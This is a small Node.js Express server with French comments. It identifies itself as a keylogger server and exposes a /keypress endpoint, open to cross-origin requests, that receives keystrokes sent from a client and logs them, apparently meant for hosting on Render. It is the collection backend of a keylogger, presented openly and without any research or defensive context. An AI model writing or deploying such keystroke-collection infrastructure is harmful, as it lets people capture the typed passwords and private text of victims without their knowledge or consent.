const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
app.use(bodyParser.json());
app.use(cors());

// Route GET obligatoire pour Render
app.get('/', (req, res) => {
    res.send("Keylogger server OK");
});

// Route qui reçoit les touches
app.post('/keypress', (req, res) => {
    const { key } = req.body;

    console.log(`Reçu une pression de touche : ${key}`);

    res.status(200).send({ message: 'Touche reçue' });
});

// Lancement du serveur
const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
